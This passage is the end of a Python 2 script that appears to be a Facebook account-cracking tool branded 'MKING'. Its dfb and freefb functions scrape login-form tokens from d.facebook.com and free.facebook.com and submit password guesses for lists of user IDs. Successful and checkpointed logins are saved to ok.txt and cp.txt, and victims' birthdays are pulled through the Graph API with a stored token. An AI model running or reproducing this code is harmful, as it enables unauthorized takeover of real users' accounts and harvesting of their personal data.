                    print '\r\x1b[1;33m [MKING-CP] %s \xe2\x80\xa2 %s \xe2\x80\xa2 %s %s %s\x1b[0;97m' % (uid, pw, day, month, year)
                    cp.append('%s | %s' % (uid, pw))
                    open('cp.txt', 'a').write('%s | %s | %s\n' % (uid, pw, ttl))
                    open('checkcp.txt', 'a').write('%s | %s | %s\n' % (uid, pw, ttl))
                    break
            except (KeyError, IOError):
                day = ' '
                month = ' '
                year = ' '
            except:
                pass

            print '\r\x1b[1;33m [MKING-CP] %s \xe2\x80\xa2 %s\x1b[0;97m        ' % (uid, pw)
            cp.append('%s | %s' % (uid, pw))
            open('cp.txt', 'a').write('%s | %s\n' % (uid, pw))
            open('checkcp.txt', 'a').write('%s | %s\n' % (uid, pw))
            break
        else:
            continue

    loop += 1


def dfb(uid, pwcuk):
    global loop
    global token
    try:
        ua = open('ua', 'r').read()
    except IOError:
        ua = 'NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+'

    sys.stdout.write('\r [Crack] %s/%s Mking-Ok:-%s - MKING-CP:-%s ' % (loop, len(id), len(ok), len(cp)))
    sys.stdout.flush()
    for pw in pwcuk:
        kwargs = {}
        pw = pw.lower()
        ses = requests.Session()
        ses.headers.update({'origin': 'https://d.facebook.com', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'accept-encoding': 'gzip, deflate', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'user-agent': ua, 'Host': 'd.facebook.com', 'referer': 'https://d.facebook.com/login/?next&ref=dbl&fl&refid=8', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'content-type': 'application/x-www-form-urlencoded'})
        p = ses.get('https://d.facebook.com/login/?next&ref=dbl&refid=8').text
        b = parser(p, 'html.parser')
        bl = ['lsd', 'jazoest', 'm_ts', 'li', 'try_number', 'unrecognized_tries', 'login']
        for i in b('input'):
            try:
                if i.get('name') in bl:
                    kwargs.update({i.get('name'): i.get('value')})
                else:
                    continue
            except:
                pass

        kwargs.update({'email': uid, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', '_fb_noscript': 'true'})
        qobil = ses.post('https://d.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fd.facebook.com%2F&lwv=100&refid=8', data=kwargs)
        if 'c_user' in ses.cookies.get_dict().keys():
            kuki = (';').join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace('noscript=1;', '')
            print '\r \x1b[1;32m[Mking-Ok] %s \xe2\x80\xa2 %s \xe2\x80\xa2 %s\x1b[0;97m' % (uid, pw, send.json()['access_token'])
            ok.append('%s | %s' % (uid, pw))
            open('ok.txt', 'a').write('%s | %s\n' % (uid, pw))
            break
        elif 'checkpoint' in ses.cookies.get_dict().keys():
            try:
                token = open('login.txt', 'r').read()
                with requests.Session() as (ses):
                    ttl = ses.get('https://graph.facebook.com/%s?access_token=%s' % (uid, token)).json()['birthday']
                    month, day, year = ttl.split('/')
                    month = bulan_ttl[month]
                    print '\r\x1b[1;33m [MKING-CP] %s \xe2\x80\xa2 %s \xe2\x80\xa2 %s %s %s\x1b[0;97m' % (uid, pw, day, month, year)
                    cp.append('%s | %s' % (uid, pw))
                    open('cp.txt', 'a').write('%s | %s | %s\n' % (uid, pw, ttl))
                    open('checkcp.txt', 'a').write('%s | %s | %s\n' % (uid, pw, ttl))
                    break
            except (KeyError, IOError):
                day = ' '
                month = ' '
                year = ' '
            except:
                pass

            print '\r\x1b[1;33m [MKING-CP] %s \xe2\x80\xa2 %s\x1b[0;97m        ' % (uid, pw)
            cp.append('%s | %s' % (uid, pw))
            open('cp.txt', 'a').write('%s | %s\n' % (uid, pw))
            open('checkcp.txt', 'a').write('%s | %s\n' % (uid, pw))
            break
        else:
            continue

    loop += 1


def freefb(uid, pwcuk):
    global loop
    global token
    try:
        ua = open('ua', 'r').read()
    except IOError:
        ua = 'NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+'

    sys.stdout.write('\r [Crack] %s/%s Mking-Ok:-%s - MKING-CP:-%s ' % (loop, len(id), len(ok), len(cp)))
    sys.stdout.flush()
    for pw in pwcuk:
        kwargs = {}
        pw = pw.lower()
        ses = requests.Session()
        ses.headers.update({'origin': 'https://free.facebook.com', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'accept-encoding': 'gzip, deflate', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'user-agent': ua, 'Host': 'free.facebook.com', 'referer': 'https://free.facebook.com/login/?next&ref=dbl&fl&refid=8', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'content-type': 'application/x-www-form-urlencoded'})
        p = ses.get('https://free.facebook.com/login/?next&ref=dbl&refid=8').text
        b = parser(p, 'html.parser')
        bl = ['lsd', 'jazoest', 'm_ts', 'li', 'try_number', 'unrecognized_tries', 'login']
        for i in b('input'):
            try:
                if i.get('name') in bl:
                    kwargs.update({i.get('name'): i.get('value')})
                else:
                    continue
            except:
                pass

        kwargs.update({'email': uid, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', '_fb_noscript': 'true'})
        qobil = ses.post('https://free.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Ffree.facebook.com%2F&lwv=100&refid=8', data=kwargs)
        if 'c_user' in ses.cookies.get_dict().keys():
            kuki = (';').join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace('noscript=1;', '')
            print '\r \x1b[1;32m[Mking-Ok] %s \xe2\x80\xa2 %s \xe2\x80\xa2 %s\x1b[0;97m' % (uid, pw, send.json()['access_token'])
            ok.append('%s | %s' % (uid, pw))
            open('ok.txt', 'a').write('%s | %s\n' % (uid, pw))
            break
        elif 'checkpoint' in ses.cookies.get_dict().keys():
            try:
                token = open('login.txt', 'r').read()
                with requests.Session() as (ses):
                    ttl = ses.get('https://graph.facebook.com/%s?access_token=%s' % (uid, token)).json()['birthday']
                    month, day, year = ttl.split('/')
                    month = bulan_ttl[month]
                    print '\r\x1b[1;33m [MKING-CP] %s \xe2\x80\xa2 %s \xe2\x80\xa2 %s %s %s\x1b[0;97m' % (uid, pw, day, month, year)
                    cp.append('%s | %s' % (uid, pw))
                    open('cp.txt', 'a').write('%s | %s | %s\n' % (uid, pw, ttl))
                    open('checkcp.txt', 'a').write('%s | %s | %s\n' % (uid, pw, ttl))
                    break
            except (KeyError, IOError):
                day = ' '
                month = ' '
                year = ' '
            except:
                pass

            print '\r\x1b[1;33m [MKING-CP] %s \xe2\x80\xa2 %s\x1b[0;97m        ' % (uid, pw)
            cp.append('%s | %s' % (uid, pw))
            open('cp.txt', 'a').write('%s | %s\n' % (uid, pw))
            open('checkcp.txt', 'a').write('%s | %s\n' % (uid, pw))
            break
        else:
            continue

    loop += 1


def hasil():
    if len(ok) != 0 or len(cp) != 0:
        exit(langsung())
    else:
        exit('\n%s [%s\xe2\x80\xa2%s] total account ? :v\n%s [%s!%s] 0:v' % (p, k, p, p, m, p))


def langsung():
    silet = raw_input('\n %s[%s\xe2\x80\xa2%s] Check Option Account Sesi?  y/t\n%s [%s\xe2\x80\xa2%s] Choose: ' % (p, k, p, p, k, p))
    if silet in ('y', 'Y'):
        option_sesi()
    elif silet in ('n', 'N'):
        os.remove('checkcp.txt')
        menu()
    else:
        exit('\n%s [%s!%s] Unknown!' % (p, m, p))


sesi = []
san_manual = []
gak_gabung = []
sandi_gabung = []
angka_nama = []
pilih = []
san_ttl = []
pw_tap = []

def setting():
    print '\n%s [%s1%s] Setting user agent\n %s[%s2%s] Check user agent' % (p, k, p, p, k, p)
    cek_prof = raw_input('\n \x1b[4;33mChoose%s:\x1b[0m\n %s\xe2\x9e\xa4%s\xe2\x9e\xa4%s\xe2\x9e\xa4%s\xe2\x9e\xa4 %s' % (p, m, k, h, b, p))
    if cek_prof in ('1', '01'):
        user_prof = raw_input('\n%s [%s\xe2\x80\xa2%s] Input user agent\n %s[%s\xe2\x80\xa2%s] User agent: ' % (p, k, p, p, k, p))
        print '%s [%s\xe2\x80\xa2%s] Please Wait!' % (p, k, p)
        time.sleep(1.5)
        open('ua', 'w').write(user_prof)
        print '%s [%s\xe2\x80\xa2%s] Succes set user agent' % (p, k, p)
        raw_input('%s [%sBack%s]' % (p, k, p))
        menu()
    elif cek_prof in ('2', '02'):
        try:
            ua = open('ua', 'r').read()
        except IOError:
            ua = 'NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+'

        print '\n%s [%s\xe2\x80\xa2%s] User agent saat ini : %s%s' % (p, k, p, h, ua)
        raw_input('\n\n %s[ %sBACK%s ]' % (p, k, p))
        menu()


def cek_folder_ok_cp():
    try:
        open('ok.txt', 'r').read()
    except Exception as e:
        os.system('touch ok.txt')

    try:
        open('cp.txt', 'r').read()
    except Exception as e:
        os.system('touch cp.txt')


if __name__ == '__main__':
    os.system('touch login.txt')
    cek_folder_ok_cp()
    mohammad()
